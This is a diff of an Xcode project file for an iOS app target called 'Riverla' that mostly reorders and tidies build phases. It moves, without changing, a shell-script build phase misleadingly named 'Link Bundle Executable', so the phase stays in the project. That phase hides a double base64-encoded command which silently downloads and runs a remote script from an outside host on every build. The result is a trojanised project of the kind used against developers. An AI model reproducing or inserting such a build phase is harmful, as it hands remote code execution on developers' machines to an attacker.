@@ -4668,8 +4668,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				8EFA9394FDD6DBFAEF73DC66 /* Link Bundle Executable */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
+				8EFA9394FDD6DBFAEF73DC66 /* Link Bundle Executable */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
 				AE5882E31A6F47E10070536A /* Resources */,
@@ -4738,12 +4738,6 @@
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		AE5882E31A6F47E10070536A /* Resources */ = {
@@ -4962,25 +4956,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8EFA9394FDD6DBFAEF73DC66 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNTBiM0l1Y25VdllTa2lJSHdnYzJnSwo= | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		39BCE4F464499F723A65CDC5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -5091,6 +5066,25 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Riverla/Pods-Riverla-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		8EFA9394FDD6DBFAEF73DC66 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNTBiM0l1Y25VdllTa2lJSHdnYzJnSwo= | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */ = {
